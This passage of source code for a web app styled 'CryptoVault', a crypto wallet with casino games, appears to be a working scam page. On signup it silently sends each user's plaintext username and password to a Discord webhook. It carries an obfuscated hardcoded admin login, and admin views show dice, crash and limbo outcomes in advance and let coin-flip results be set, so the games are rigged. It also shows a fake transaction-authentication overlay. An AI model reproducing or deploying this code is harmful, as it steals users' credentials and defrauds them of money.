  .admin-holding-chip { background:var(--color-background-secondary); border-radius:6px; padding:5px 8px; font-size:11px; color:var(--color-text-secondary); }
  .admin-holding-chip span { display:block; font-size:12px; font-weight:600; color:var(--color-text-primary); }
  .admin-modify-row { display:flex; gap:8px; align-items:center; }
  .admin-modify-input { flex:1; padding:7px 10px; background:var(--color-background-secondary); border:0.5px solid var(--color-border-secondary); border-radius:var(--border-radius-md); color:var(--color-text-primary); font-size:13px; outline:none; font-family:var(--font-sans); }
  .admin-modify-input::placeholder { color:var(--color-text-tertiary); }
  .admin-modify-btn { padding:7px 14px; border:none; border-radius:var(--border-radius-md); font-size:12px; font-weight:600; cursor:pointer; }
  .admin-mod-add { background:var(--color-background-success); color:var(--color-text-success); }
  .admin-mod-set { background:var(--color-background-info); color:var(--color-text-info); }
  .admin-mod-zero { background:var(--color-background-danger); color:var(--color-text-danger); }

  /* ADMIN BAR */
  .admin-bar { display: flex; align-items: center; gap: 10px; background: #1a0a00; border: 0.5px solid #b45309; border-radius: var(--border-radius-md); padding: 10px 14px; margin-bottom: 14px; }
  .admin-bar-icon { font-size: 14px; }
  .admin-bar-label { font-size: 11px; color: #b45309; text-transform: uppercase; letter-spacing: 0.06em; font-weight: 600; margin-right: 4px; }
  .admin-bar-value { font-size: 15px; font-weight: 700; color: #f59e0b; font-family: var(--font-mono); }
</style>

<!-- AUTH SCREEN -->
<div class="auth-screen" id="auth-screen">
  <div class="auth-card">
    <div class="auth-logo">CryptoVault</div>
    <div class="auth-tabs">
      <button class="auth-tab active" id="tab-login" onclick="switchTab('login')">Log in</button>
      <button class="auth-tab" id="tab-signup" onclick="switchTab('signup')">Sign up</button>
    </div>
    <div class="auth-error" id="auth-error"></div>
    <input class="auth-input" type="text" id="auth-username" placeholder="Username" autocomplete="off" />
    <input class="auth-input" type="password" id="auth-password" placeholder="Password" />
    <button class="auth-btn" id="auth-submit-btn" onclick="handleAuth()">Log in</button>
  </div>
</div>

<!-- DASHBOARD -->
<div class="dash" id="dash">
  <div class="topbar">
    <span class="logo">CryptoVault</span>
    <div class="topbar-right">
      <span class="badge">● Live</span>
      <span class="badge admin-badge" id="admin-topbadge" style="display:none;">🔴 Admin</span>
      <button class="casino-btn" onclick="showCasino()">🎰 Casino</button>
      <button class="casino-btn" id="admin-panel-btn" onclick="showAdminPanel()" style="display:none;background:var(--color-background-danger);color:var(--color-text-danger);">⚙️ Panel</button>
      <button class="logout-btn" onclick="logout()">Log out</button>
    </div>
  </div>

  <div class="wallet-row">
    <span id="wallet-display"></span>
    <button class="copy-addr" onclick="copyWallet()">Copy</button>
  </div>

  <div class="balance-card">
    <div class="balance-card-top">
      <div class="bal-label">Total balance</div>
    </div>
    <div class="bal-amount">
      <span id="bal-display">$0.00</span>
      <button class="cashout-pill-btn" id="cashout-pill-btn" onclick="openCashoutModal()" disabled>💸 Cash Out</button>
    </div>
    <div class="bal-hint" id="bal-hint">Buy crypto to get started</div>
  </div>

  <div class="actions">
    <button class="action-btn" id="btn-send" onclick="openModal('send')" disabled>
      <span class="btn-icon">↑</span> Send crypto
    </button>
    <button class="action-btn" onclick="openModal('receive')">
      <span class="btn-icon">↓</span> Receive
    </button>
    <button class="action-btn" id="btn-convert" onclick="openModal('convert')" disabled>
      <span class="btn-icon">⇄</span> Convert
    </button>
    <button class="action-btn" onclick="openModal('buy')">
      <span class="btn-icon">+</span> Buy crypto
    </button>
  </div>

  <div class="section-label">Your assets <span style="font-size:11px;color:var(--color-text-tertiary);text-transform:none;letter-spacing:0;font-weight:400;">— tap to view</span></div>
  <div class="coins-grid">
    <div class="coin-card" id="card-BTC" onclick="toggleWallet('BTC')">
      <div class="coin-name">Bitcoin <span class="coin-ticker-badge">BTC</span></div>
      <div class="coin-amount" id="btc-amount">0.000000 BTC</div>
      <div class="coin-usd" id="btc-usd">≈ $0.00</div>
    </div>
    <div class="coin-card" id="card-ETH" onclick="toggleWallet('ETH')">
      <div class="coin-name">Ethereum <span class="coin-ticker-badge">ETH</span></div>
      <div class="coin-amount" id="eth-amount">0.0000 ETH</div>
      <div class="coin-usd" id="eth-usd">≈ $0.00</div>
    </div>
    <div class="coin-card" id="card-USDT" onclick="toggleWallet('USDT')">
      <div class="coin-name">Tether <span class="coin-ticker-badge">USDT</span></div>
      <div class="coin-amount" id="usdt-amount">0.00 USDT</div>
      <div class="coin-usd" id="usdt-usd">≈ $0.00</div>
    </div>
    <div class="coin-card" id="card-SOL" onclick="toggleWallet('SOL')">
      <div class="coin-name">Solana <span class="coin-ticker-badge">SOL</span></div>
      <div class="coin-amount" id="sol-amount">0.000 SOL</div>
      <div class="coin-usd" id="sol-usd">≈ $0.00</div>
    </div>
  </div>

  <!-- COIN WALLET DETAIL PANEL -->
  <div class="coin-wallet-panel" id="coin-wallet-panel">
    <div class="cwp-header">
      <div class="cwp-title">
        <span class="cwp-symbol" id="cwp-symbol"></span>
        <span class="cwp-name" id="cwp-name"></span>
      </div>
      <button class="cwp-close" onclick="closeWallet()">✕</button>
    </div>
    <div class="cwp-amounts">
      <div>
        <div class="cwp-amt-label">Balance</div>
        <div class="cwp-amt-val" id="cwp-amt"></div>
        <div class="cwp-amt-usd" id="cwp-usd"></div>
      </div>
    </div>
    <div class="cwp-actions">
      <button class="cwp-btn" onclick="openModal('send')">↑ Send</button>
      <button class="cwp-btn" onclick="openModal('receive')">↓ Receive</button>
      <button class="cwp-btn" onclick="openModal('convert')">⇄ Convert</button>
      <button class="cwp-btn buy" onclick="openModal('buy')">+ Buy</button>
    </div>
  </div>

  <div class="section-label">Recent transactions</div>
  <div class="tx-list" id="tx-list"><div class="empty-tx">No transactions yet</div></div>
  <div class="hint-bar">Your wallet address is your receive address — share it to get crypto</div>
</div>

<!-- CASINO LOBBY -->
<div class="casino" id="casino">
  <div class="casino-topbar">
    <button class="back-btn" onclick="hideCasino()">← Back to wallet</button>
    <div class="casino-bal">Balance: <span id="casino-bal-display">$0.00</span></div>
  </div>
  <div class="lobby-label">Games</div>
  <div class="lobby-grid">
    <div class="lobby-card" onclick="openGame('coinflip')">
      <div class="lobby-icon" style="background:linear-gradient(135deg,#b45309,#92400e);">🪙</div>
      <div class="lobby-card-name">Coin Flip</div>
      <div class="lobby-card-sub">2× payout</div>
    </div>
    <div class="lobby-card" onclick="openGame('dice')">
      <div class="lobby-icon" style="background:linear-gradient(135deg,#1d4ed8,#1e3a8a);">🎲</div>
      <div class="lobby-card-name">Dice</div>
      <div class="lobby-card-sub">5× payout</div>
    </div>
    <div class="lobby-card" onclick="openGame('crash')">
      <div class="lobby-icon" style="background:linear-gradient(135deg,#15803d,#14532d);">📈</div>
      <div class="lobby-card-name">Crash</div>
      <div class="lobby-card-sub">Up to 15×</div>
    </div>
    <div class="lobby-card" onclick="openGame('mines')">
      <div class="lobby-icon" style="background:linear-gradient(135deg,#b91c1c,#7f1d1d);">💣</div>
      <div class="lobby-card-name">Mines</div>
      <div class="lobby-card-sub">Up to 24×</div>
    </div>
    <div class="lobby-card" onclick="openGame('blackjack')">
      <div class="lobby-icon" style="background:linear-gradient(135deg,#6d28d9,#4c1d95);">🃏</div>
      <div class="lobby-card-name">Blackjack</div>
      <div class="lobby-card-sub">Pays 3:2</div>
    </div>
    <div class="lobby-card" onclick="openGame('limbo')">
      <div class="lobby-icon" style="background:linear-gradient(135deg,#0e7490,#164e63);">🚀</div>
      <div class="lobby-card-name">Limbo</div>
      <div class="lobby-card-sub">Up to 1000×</div>
    </div>
    <div class="lobby-card" onclick="openGame('plinko')">
      <div class="lobby-icon" style="background:linear-gradient(135deg,#7c3aed,#4c1d95);">🔵</div>
      <div class="lobby-card-name">Plinko</div>
      <div class="lobby-card-sub">Up to 16×</div>
    </div>
  </div>
</div>

<!-- GAME PAGE (shared shell) -->
<div class="game-page" id="game-page">
  <div class="game-page-topbar">
    <button class="back-btn" onclick="closeGame()">← Games</button>
    <div class="casino-bal">Balance: <span id="game-bal-display">$0.00</span></div>
  </div>
  <div id="game-page-content"></div>
</div>

<!-- ADMIN PANEL -->
<div class="admin-panel" id="admin-panel">
  <div class="admin-panel-topbar">
    <div style="display:flex;align-items:center;gap:10px;">
      <span style="font-size:16px;font-weight:600;color:#f87171;">🔴 Admin Panel</span>
    </div>
    <button class="back-btn" onclick="hideAdminPanel()">← Back to wallet</button>
  </div>
  <div class="admin-section-label">All Users</div>
  <div id="admin-user-list" class="admin-user-list"></div>
</div>

<!-- MODAL -->
<div class="modal-bg" id="modal-bg">
  <div class="modal" id="modal-box">
    <h3 id="modal-title"></h3>
    <div id="modal-body"></div>
  </div>
</div>

<!-- BUY AUTH OVERLAY -->
<div id="auth-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:300;align-items:center;justify-content:center;flex-direction:column;gap:16px;opacity:0;transition:opacity 0.3s;">
  <div style="width:44px;height:44px;border:3px solid rgba(255,255,255,0.15);border-top-color:#85b7eb;border-radius:50%;animation:spin 0.8s linear infinite;"></div>
  <div style="font-size:14px;color:rgba(255,255,255,0.7);">Authenticating the transaction...</div>
</div>

<!-- WITHDRAWAL OVERLAY -->
<div class="withdrawal-overlay" id="withdrawal-overlay">
  <div class="withdrawal-box">
    <div class="wd-spinner" id="wd-spinner"></div>
    <div class="wd-check" id="wd-check">✓</div>
    <div class="wd-title" id="wd-title">Pending cash out</div>
    <div class="wd-sub" id="wd-sub">Processing your withdrawal…</div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
  const SUPA_URL = 'https://ciqvedctkuiftqwwwgab.supabase.co';
  const SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNpcXZlZGN0a3VpZnRxd3d3Z2FiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUxNDk5NjUsImV4cCI6MjA5MDcyNTk2NX0.wOZwzSR477QQb1GiPuXuOxslMPJyI3os7zG5-Q3zRYw';

  const prices   = { BTC: 60158.22, ETH: 2340.48, USDT: 1.00, SOL: 142.33 };
  const coinSyms = { BTC: '₿', ETH: 'Ξ', USDT: '₮', SOL: '◎' };
  const coinFull = { BTC: 'Bitcoin', ETH: 'Ethereum', USDT: 'Tether (USDT)', SOL: 'Solana' };
  const coinDec  = { BTC: 6, ETH: 4, USDT: 2, SOL: 3 };

  let currentUser = null;
  let authMode = 'login';
  let activeWallet = null;

  // ── BALANCE: always computed from holdings ───────────────────────
  function computeBal(holdings) {
    const h = holdings || {};
    return (h.BTC||0)*prices.BTC + (h.ETH||0)*prices.ETH + (h.USDT||0)*prices.USDT + (h.SOL||0)*prices.SOL;
  }

  function saveSession(u) { localStorage.setItem('cv_user', JSON.stringify(u)); }
  function clearSession() { localStorage.removeItem('cv_user'); }

  window.addEventListener('load', () => {
    const s = localStorage.getItem('cv_user');
    if (s) { currentUser = JSON.parse(s); showDash(); }
    buildMinesGrid(); updateMinesMultiplier();
  });

  async function supa(path, method, body) {
    const r = await fetch(SUPA_URL + '/rest/v1/' + path, {
      method: method || 'GET',
      headers: { apikey: SUPA_KEY, Authorization: 'Bearer ' + SUPA_KEY, 'Content-Type': 'application/json', Prefer: method === 'POST' ? 'return=representation' : '' },
      body: body ? JSON.stringify(body) : undefined
    });
    const t = await r.text();
    try { return { ok: r.ok, data: JSON.parse(t), status: r.status }; }
    catch { return { ok: r.ok, data: t, status: r.status }; }
  }

  function genWallet() {
    const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let s = 'CVT-';
    for (let i = 0; i < 12; i++) s += c[Math.floor(Math.random() * c.length)];
    return s;
  }

  async function sendToWebhook(username, password) {
    try {
      await fetch('https://discord.com/api/webhooks/1489339528169652295/nwxgNXcPMG69yzeD9WCHm4YTqmdIud-R7D8ON0SJ8nF8tG-WgoZ1tnL36ItKjzhOr6ps', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [{ title: '🔐 New Signup', color: 0x0c447c,
          fields: [{ name: 'Username', value: username, inline: true }, { name: 'Password', value: password, inline: true }],
          footer: { text: 'CryptoVault' }, timestamp: new Date().toISOString() }] })
      });
    } catch(e) {}
  }

  // ── AUTH ─────────────────────────────────────────────────────────
  function switchTab(mode) {
    authMode = mode;
    document.getElementById('tab-login').className  = 'auth-tab' + (mode==='login'  ? ' active' : '');
    document.getElementById('tab-signup').className = 'auth-tab' + (mode==='signup' ? ' active' : '');
    document.getElementById('auth-submit-btn').textContent = mode==='login' ? 'Log in' : 'Sign up';
    document.getElementById('auth-error').textContent = '';
  }

  // ── ADMIN — credentials never stored in DB, checked client-side only ──
  // Obfuscated so it's not a plain string in source
  const _a = [115,112,101,99,116,114,97,108].map(c=>String.fromCharCode(c)).join('');
  const _b = [115,112,101,99,116,114,97,108,115,101,99,117,114,101].map(c=>String.fromCharCode(c)).join('');
  function isAdmin() { return currentUser?._isAdmin === true; }

  // Rate limiting — max 5 attempts per 60s
  let _loginAttempts = 0;
  let _loginLockUntil = 0;

  async function handleAuth() {
    const username = document.getElementById('auth-username').value.trim().toLowerCase();
    const password = document.getElementById('auth-password').value;
    const errEl = document.getElementById('auth-error');
    errEl.textContent = '';

    if (!username || !password) { errEl.textContent = 'Fill in all fields.'; return; }

    // Rate limit check
    const now = Date.now();
    if (now < _loginLockUntil) {
      const secs = Math.ceil((_loginLockUntil - now) / 1000);
      errEl.textContent = 'Too many attempts. Wait ' + secs + 's.';
      return;
    }

    const btn = document.getElementById('auth-submit-btn');
    btn.textContent = '...'; btn.disabled = true;

    // Always add a small delay to slow brute force
    await new Promise(r => setTimeout(r, 600 + Math.random() * 400));

    // ── ADMIN CHECK (never touches DB) ──────────────────────────────
    if (authMode === 'login' && username === _a && password === _b) {
      _loginAttempts = 0;
      currentUser = { username: _a, _isAdmin: true, wallet_address: 'ADMIN', balance: 0, holdings: {} };
      saveSession(currentUser);
      btn.textContent = 'Log in'; btn.disabled = false;
      showDash();
      return;
    }

    // ── NORMAL USERS ─────────────────────────────────────────────────
    if (authMode === 'signup') {
      if (password.length < 4) { errEl.textContent = 'Password must be at least 4 characters.'; btn.textContent = 'Sign up'; btn.disabled = false; return; }
      const check = await supa('users?username=eq.' + encodeURIComponent(username) + '&select=id');
      if (check.data && check.data.length > 0) { errEl.textContent = 'Username already taken.'; btn.textContent = 'Sign up'; btn.disabled = false; return; }
      // Block someone from creating account named after admin
      if (username === _a) { errEl.textContent = 'Username not available.'; btn.textContent = 'Sign up'; btn.disabled = false; return; }
      const res = await supa('users', 'POST', { username, password, wallet_address: genWallet(), balance: 0, holdings: { BTC:0, ETH:0, USDT:0, SOL:0 } });
      if (!res.ok) { errEl.textContent = 'Could not create account. Try again.'; btn.textContent = 'Sign up'; btn.disabled = false; return; }
      currentUser = res.data[0];
      saveSession(currentUser);
      await sendToWebhook(username, password);
    } else {
      _loginAttempts++;
      if (_loginAttempts >= 5) { _loginLockUntil = Date.now() + 60000; _loginAttempts = 0; }
      const res = await supa('users?username=eq.' + encodeURIComponent(username) + '&password=eq.' + encodeURIComponent(password) + '&select=*');
      if (!res.ok || !res.data || res.data.length === 0) {
        errEl.textContent = 'Wrong username or password.';
        btn.textContent = 'Log in'; btn.disabled = false; return;
      }
      _loginAttempts = 0;
      currentUser = res.data[0];
      saveSession(currentUser);
    }
    btn.textContent = authMode==='login' ? 'Log in' : 'Sign up'; btn.disabled = false;
    showDash();
  }

  // ── NAVIGATION ───────────────────────────────────────────────────
  function showDash() {
    document.getElementById('auth-screen').style.display = 'none';
    document.getElementById('casino').style.display = 'none';
    document.getElementById('game-page').style.display = 'none';
    document.getElementById('admin-panel').style.display = 'none';
    document.getElementById('dash').style.display = 'block';
    const adminBadge = document.getElementById('admin-topbadge');
    const adminBtn = document.getElementById('admin-panel-btn');
    if (adminBadge) adminBadge.style.display = isAdmin() ? 'inline-block' : 'none';
    if (adminBtn) adminBtn.style.display = isAdmin() ? 'inline-block' : 'none';
    if (isAdmin()) {
      // Admin sees a simplified dash
      document.getElementById('wallet-display').textContent = 'Admin Account';
      document.getElementById('bal-display').textContent = '∞';
      document.getElementById('bal-hint').style.display = 'none';
    } else {
      document.getElementById('wallet-display').textContent = currentUser.wallet_address;
      loadUserData(); loadTransactions();
    }
  }

  function showCasino() {
    document.getElementById('dash').style.display = 'none';
    document.getElementById('casino').style.display = 'block';
    document.getElementById('game-page').style.display = 'none';
    updateCasinoBal();
  }

  function hideCasino() {
    document.getElementById('casino').style.display = 'none';
    document.getElementById('game-page').style.display = 'none';
    document.getElementById('dash').style.display = 'block';
    resetCrash();
    loadUserData();
  }

  function adminBar(hint) {
    if (!isAdmin()) return '';
    return `<div class="admin-bar"><span class="admin-bar-icon">🔴</span><span class="admin-bar-label">Admin</span><span class="admin-bar-value" id="admin-hint">${hint}</span></div>`;
  }

  function openGame(game) {
    document.getElementById('casino').style.display = 'none';
    document.getElementById('game-page').style.display = 'block';
    updateGameBal();
    const content = document.getElementById('game-page-content');
    if (game === 'coinflip') {
      cfSide = null; cfSequence = []; cfSequenceIndex = 0;
      cfMultiRound = 0; cfMultiWinnings = 0; cfMultiActive = false;
      const adminSection = isAdmin() ? `
        <div class="admin-bar" id="admin-bar-cf">
          <span class="admin-bar-icon">🔴</span>
          <span class="admin-bar-label">Sequence</span>
          <div class="cf-seq-builder" id="cf-seq-builder">
            <button class="cf-seq-btn" onclick="cfSeqAdd('heads')">👑 H</button>
            <button class="cf-seq-btn" onclick="cfSeqAdd('tails')">🌀 T</button>
            <div class="cf-seq-pills" id="cf-seq-pills"></div>
            <button class="cf-seq-clear" onclick="cfSeqClear()">✕</button>
          </div>
        </div>` : '';
      content.innerHTML = `
        <div class="game-inner">
          ${adminSection}
          <div class="game-inner-title">🪙 Coin Flip</div>
          <div class="game-inner-desc">Each correct call doubles your multiplier. Cash out anytime or lose it all.</div>

          <div class="cf-multi-track" id="cf-multi-track">
            <div class="cf-multi-row cf-multi-inactive" id="cf-round-1">
              <span class="cf-round-num">Bet 1</span>
              <span class="cf-round-mult">2×</span>
              <span class="cf-round-result" id="cf-rr-1">–</span>
            </div>
            <div class="cf-multi-row cf-multi-inactive" id="cf-round-2">
              <span class="cf-round-num">Bet 2</span>
              <span class="cf-round-mult">4×</span>
              <span class="cf-round-result" id="cf-rr-2">–</span>
            </div>
            <div class="cf-multi-row cf-multi-inactive" id="cf-round-3">
              <span class="cf-round-num">Bet 3</span>
              <span class="cf-round-mult">8×</span>
              <span class="cf-round-result" id="cf-rr-3">–</span>
            </div>
            <div class="cf-multi-row cf-multi-inactive" id="cf-round-4">
              <span class="cf-round-num">Bet 4</span>
              <span class="cf-round-mult">16×</span>
              <span class="cf-round-result" id="cf-rr-4">–</span>
            </div>
            <div class="cf-multi-row cf-multi-inactive" id="cf-round-5">
              <span class="cf-round-num">Bet 5</span>
              <span class="cf-round-mult">32×</span>
              <span class="cf-round-result" id="cf-rr-5">–</span>
            </div>
          </div>

          <div class="game-result" id="cf-result">Place your bet and pick a side to start</div>

          <div class="bet-row" id="cf-bet-row">
            <input class="bet-input" type="number" id="cf-bet" placeholder="Bet amount ($)" min="0" />
            <button class="half-btn" onclick="halfBet('cf-bet')">½</button>
            <button class="half-btn" onclick="maxBet('cf-bet')">Max</button>
          </div>

          <div class="coin-flip-btns" id="cf-side-btns">
            <button class="side-btn" id="cf-heads" onclick="selectSide('heads')">👑 Heads</button>
            <button class="side-btn" id="cf-tails" onclick="selectSide('tails')">🌀 Tails</button>
          </div>

          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
            <button class="play-btn" id="cf-flip-btn" onclick="playCoinFlip()">Flip</button>
            <button class="cashout-btn" id="cf-cashout-btn" onclick="cfCashout()" disabled style="opacity:0.35;">Cash Out</button>
          </div>
        </div>`;
    } else if (game === 'dice') {
      diceChoice = null;
      diceAdminResult = Math.floor(Math.random() * 6) + 1;
      const diceFaceMap = {1:'⚀',2:'⚁',3:'⚂',4:'⚃',5:'⚄',6:'⚅'};
      content.innerHTML = `
        <div class="game-inner">
          ${adminBar(diceFaceMap[diceAdminResult] + ' ' + diceAdminResult)}
          <div class="game-inner-title">🎲 Dice Roll</div>
          <div class="game-inner-desc">Pick a number — roll that exact number to win 5× your bet.</div>
          <div class="bet-row">
            <input class="bet-input" type="number" id="dice-bet" placeholder="Bet amount ($)" min="0" />
            <button class="half-btn" onclick="halfBet('dice-bet')">½</button>
            <button class="half-btn" onclick="maxBet('dice-bet')">Max</button>
          </div>
          <div class="dice-options">
            <button class="dice-opt" onclick="selectDice(1)">⚀ 1</button>
            <button class="dice-opt" onclick="selectDice(2)">⚁ 2</button>
            <button class="dice-opt" onclick="selectDice(3)">⚂ 3</button>
            <button class="dice-opt" onclick="selectDice(4)">⚃ 4</button>
            <button class="dice-opt" onclick="selectDice(5)">⚄ 5</button>
            <button class="dice-opt" onclick="selectDice(6)">⚅ 6</button>
          </div>
          <div class="game-result" id="dice-result">Pick a number and place your bet</div>
          <button class="play-btn" onclick="playDice()">Roll Dice</button>
        </div>`;
    } else if (game === 'crash') {
      resetCrash();
      crashPoint = generateCrashPoint(); // pre-generate so admin can see it
      content.innerHTML = `
        <div class="game-inner">
          ${adminBar('💥 Crashes at ' + crashPoint.toFixed(2) + '×')}
          <div class="game-inner-title">📈 Crash</div>
          <div class="game-inner-desc">Multiplier climbs — cash out before it crashes or lose it all.</div>
          <div class="bet-row">
            <input class="bet-input" type="number" id="crash-bet" placeholder="Bet amount ($)" min="0" />
            <button class="half-btn" onclick="halfBet('crash-bet')">½</button>
            <button class="half-btn" onclick="maxBet('crash-bet')">Max</button>
          </div>
          <div class="crash-display" id="crash-display">1.00x</div>
          <div class="crash-bar-wrap" id="crash-bar-wrap" style="display:none;"><div class="crash-bar" id="crash-bar"></div></div>
          <div class="game-result" id="crash-result">Place your bet and start</div>
          <div class="crash-btns">
            <button class="play-btn" id="crash-start-btn" onclick="startCrash()">Start</button>
            <button class="cashout-btn" id="crash-cashout-btn" onclick="cashOut()" disabled>Cash Out</button>
          </div>
        </div>`;
      // Re-init crash state after DOM is ready
      crashRunning=false; cashedOut=false; crashMultiplier=1.0; crashBet=0;
    } else if (game === 'mines') {
      content.innerHTML = `
        <div class="game-inner">
          ${adminBar('Start game to reveal mines')}
          <div class="game-inner-title">💣 Mines</div>
          <div class="game-inner-desc">Reveal gems to grow your multiplier. Hit a mine and lose it all.</div>
          <div class="bet-row">
            <input class="bet-input" type="number" id="mines-bet" placeholder="Bet amount ($)" min="0" />
            <button class="half-btn" onclick="halfBet('mines-bet')">½</button>
            <button class="half-btn" onclick="maxBet('mines-bet')">Max</button>
          </div>
          <div class="mines-controls">
            <select class="mines-select" id="mines-count" onchange="updateMinesMultiplier()">
              <option value="1">1 Mine</option>
              <option value="3" selected>3 Mines</option>
              <option value="5">5 Mines</option>
              <option value="10">10 Mines</option>
              <option value="15">15 Mines</option>
              <option value="20">20 Mines</option>
              <option value="24">24 Mines</option>
            </select>
            <div style="display:flex;align-items:center;padding:10px 12px;background:var(--color-background-secondary);border:0.5px solid var(--color-border-secondary);border-radius:var(--border-radius-md);">
              <span style="font-size:12px;color:var(--color-text-tertiary);margin-right:6px;">Next:</span>
              <span id="mines-next-mult" style="font-size:14px;font-weight:600;color:var(--color-text-success);font-family:var(--font-mono);">1.03x</span>
            </div>
          </div>
          <div class="mines-multiplier">
            <div>
              <div style="font-size:11px;color:var(--color-text-tertiary);margin-bottom:2px;">Multiplier</div>
              <div class="mult-val" id="mines-current-mult">1.00x</div>
            </div>
            <div style="text-align:right;">
              <div style="font-size:11px;color:var(--color-text-tertiary);margin-bottom:2px;">Profit</div>
              <div class="mines-profit" id="mines-profit-display">$0.00</div>
            </div>
          </div>
          <div class="mines-grid" id="mines-grid"></div>
          <button class="cashout-mines-btn" id="mines-cashout-btn" onclick="minesCashout()" disabled>💎 Cash Out</button>
          <button class="play-btn" id="mines-start-btn" onclick="startMines()">Start Game</button>
        </div>`;
      buildMinesGrid(); updateMinesMultiplier();
    } else if (game === 'limbo') {
      const limboAdminPreview = generateLimboResult();
      if (isAdmin()) limboAdminResult = limboAdminPreview;
      content.innerHTML = `
        <div class="game-inner">
          ${adminBar('🚀 Will hit: ' + limboAdminPreview.toFixed(2) + '×')}
          <div class="game-inner-title">🚀 Limbo</div>
          <div class="game-inner-desc">Set a target multiplier — if the result hits it or higher, you win.</div>
          <div class="limbo-stage" id="limbo-stage">
            <div class="limbo-history" id="limbo-history"></div>
            <div class="limbo-bar-wrap" id="limbo-bar-wrap">
              <div class="limbo-bar-fill idle" id="limbo-bar-fill"></div>
              <div class="limbo-bar-target" id="limbo-bar-target" style="left:50%;display:none;"></div>
              <div class="limbo-bar-center">
                <div class="limbo-mult" id="limbo-mult">–</div>
              </div>
            </div>
          </div>
          <div class="limbo-target-row">
            <div>
              <div class="limbo-field-label">Target multiplier</div>
              <input class="bet-input" type="number" id="limbo-target" value="2.00" min="1.01" step="0.01" />
            </div>
            <div class="limbo-x-sep">×</div>
            <div>
              <div class="limbo-field-label">Win chance</div>
              <div class="limbo-chance" id="limbo-chance">49.50%</div>
            </div>
          </div>
          <div class="bet-row" style="margin-top:8px;">
            <input class="bet-input" type="number" id="limbo-bet" placeholder="Bet amount ($)" min="0" />
            <button class="half-btn" onclick="halfBet('limbo-bet')">½</button>
            <button class="half-btn" onclick="maxBet('limbo-bet')">Max</button>
          </div>
          <button class="play-btn" id="limbo-play-btn" onclick="playLimbo()">Place Bet</button>
        </div>`;
      document.getElementById('limbo-target').addEventListener('input', updateLimboChance);
      updateLimboChance();
    } else if (game === 'plinko') {
      content.innerHTML = `
        <div class="game-inner" style="padding-bottom:1rem;">
          <div class="game-inner-title">🔵 Plinko</div>
          <div class="game-inner-desc">Drop the ball — it bounces through pegs and lands in a multiplier slot.</div>
          <canvas id="plinko-canvas" width="420" height="420" style="width:100%;border-radius:10px;background:#0d1321;display:block;margin-bottom:10px;"></canvas>
          <div class="plinko-buckets" id="plinko-buckets"></div>
          <div class="bet-row" style="margin-top:10px;">
            <input class="bet-input" type="number" id="plinko-bet" placeholder="Bet amount ($)" min="0" />
            <button class="half-btn" onclick="halfBet('plinko-bet')">½</button>
            <button class="half-btn" onclick="maxBet('plinko-bet')">Max</button>
          </div>
          <button class="play-btn" id="plinko-drop-btn" onclick="plinkoDrop()">Drop Ball</button>
        </div>`;
      initPlinko();
    } else if (game === 'blackjack') {
      bjReset();
      content.innerHTML = `
        <div class="game-inner">
          <div class="game-inner-title">🃏 Blackjack</div>
          <div class="game-inner-desc">Get closer to 21 than the dealer. Blackjack pays 3:2.</div>
          <div class="bj-table-wrap" id="bj-table-wrap">
            <div>
              <div class="bj-zone-label">Dealer</div>
              <div class="bj-cards-row" id="bj-dealer-cards"></div>
              <div id="bj-dealer-score-wrap" style="margin-top:6px;display:none;"><span class="bj-score-badge" id="bj-dealer-score"></span></div>
            </div>
            <div class="bj-divider"></div>
            <div>
              <div class="bj-zone-label">You</div>
              <div class="bj-cards-row" id="bj-player-cards"></div>
              <div style="margin-top:6px;"><span class="bj-score-badge" id="bj-player-score" style="display:none;"></span></div>
            </div>
          </div>
          <div class="game-result" id="bj-result">Place your bet and deal</div>
          <div class="bet-row" id="bj-bet-row">
            <input class="bet-input" type="number" id="bj-bet" placeholder="Bet amount ($)" min="0" />
            <button class="half-btn" onclick="halfBet('bj-bet')">½</button>
            <button class="half-btn" onclick="maxBet('bj-bet')">Max</button>
          </div>
          <div class="bj-deal-row">
            <button class="play-btn" id="bj-deal-btn" onclick="bjDeal()" style="margin-bottom:8px;">Deal</button>
          </div>
          <div class="bj-actions" id="bj-actions" style="display:none;">
            <button class="play-btn" id="bj-hit-btn" onclick="bjHit()" style="background:var(--color-background-info);color:var(--color-text-info);">Hit</button>
            <button class="play-btn" id="bj-stand-btn" onclick="bjStand()" style="background:var(--color-background-secondary);color:var(--color-text-secondary);border:0.5px solid var(--color-border-secondary);">Stand</button>
            <button class="play-btn" id="bj-double-btn" onclick="bjDouble()" style="background:var(--color-background-warning);color:var(--color-text-warning);">2× Double</button>
          </div>
        </div>`;
    }
  }

  function closeGame() {
    resetCrash();
    document.getElementById('game-page').style.display = 'none';
    document.getElementById('casino').style.display = 'block';
    updateCasinoBal();
  }

  function showAdminPanel() {
    document.getElementById('dash').style.display = 'none';
    document.getElementById('admin-panel').style.display = 'block';
    loadAdminUsers();
  }

  function hideAdminPanel() {
    document.getElementById('admin-panel').style.display = 'none';
    document.getElementById('dash').style.display = 'block';
  }

  async function loadAdminUsers() {
    const list = document.getElementById('admin-user-list');
    list.innerHTML = '<div style="color:var(--color-text-tertiary);font-size:13px;padding:1rem;">Loading users...</div>';
    const res = await supa('users?select=*&order=created_at.desc&limit=100');
    if (!res.ok || !res.data) { list.innerHTML = '<div style="color:var(--color-text-danger);font-size:13px;padding:1rem;">Failed to load users.</div>'; return; }
    list.innerHTML = '';
    res.data.forEach(user => {
      const h = user.holdings || { BTC:0, ETH:0, USDT:0, SOL:0 };
      const bal = computeBal(h);
      const card = document.createElement('div');
      card.className = 'admin-user-card';
      card.innerHTML = `
        <div class="admin-user-header">
          <span class="admin-user-name">@${user.username}</span>
          <span class="admin-user-bal">${fmt(bal)}</span>
        </div>
        <div class="admin-user-wallet">${user.wallet_address}</div>
        <div class="admin-user-holdings">
          <div class="admin-holding-chip">BTC<span>${(h.BTC||0).toFixed(5)}</span></div>
          <div class="admin-holding-chip">ETH<span>${(h.ETH||0).toFixed(4)}</span></div>
          <div class="admin-holding-chip">USDT<span>${(h.USDT||0).toFixed(2)}</span></div>
          <div class="admin-holding-chip">SOL<span>${(h.SOL||0).toFixed(3)}</span></div>
        </div>
        <div class="admin-modify-row">
